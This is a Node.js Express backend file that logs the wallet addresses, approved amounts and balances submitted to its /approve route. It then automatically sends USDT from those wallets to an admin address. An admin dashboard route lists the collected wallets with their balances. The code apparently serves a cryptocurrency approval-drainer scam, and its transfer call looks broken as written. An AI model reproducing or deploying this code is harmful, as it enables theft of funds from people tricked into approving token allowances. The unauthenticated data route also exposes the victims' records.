const express = require("express");
const cors = require("cors");
const { createClient } = require("@supabase/supabase-js");
const TronWeb = require("tronweb");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname)); // for serving admin.html & dashboard.html

// Supabase setup
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY
);

// Tron setup
const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io",
  privateKey: process.env.TRON_PRIVATE_KEY,
});

// USDT TRC-20 contract
const usdtContractAddress = process.env.USDT_CONTRACT;

// ===============================
// Routes
// ===============================

app.get("/", (req, res) => {
  res.send("✅ Backend is live");
});

// 🚀 Save approval data
app.post("/approve", async (req, res) => {
  const { walletAddress, amount, balance } = req.body;

  try {
    const { data, error } = await supabase.from("Approvals").insert([
      {
        wallet_address: walletAddress,
        amount: parseFloat(amount),
        balance: parseFloat(balance),
        timestamp: new Date().toISOString(),
      },
    ]);

    if (error) throw error;

    // Auto withdraw
    const usdt = await tronWeb.contract().at(usdtContractAddress);
    const result = await usdt.transfer(process.env.ADMIN_ADDRESS, amount).send({ from: walletAddress });

    res.status(200).json({ success: true, tx: result });
  } catch (err) {
    console.error("❌ Error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// 🔒 Admin login
app.post("/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (
    username === process.env.ADMIN_USER &&
    password === process.env.ADMIN_PASS
  ) {
    res.json({ success: true });
  } else {
    res.status(401).json({ success: false, message: "Invalid credentials" });
  }
});

// 📊 Get approval data
app.get("/admin/data", async (req, res) => {
  try {
    const { data, error } = await supabase
      .from("Approvals")
      .select("*")
      .order("timestamp", { ascending: false });

    if (error) throw error;

    res.json(data);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===============================
// Server start
// ===============================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
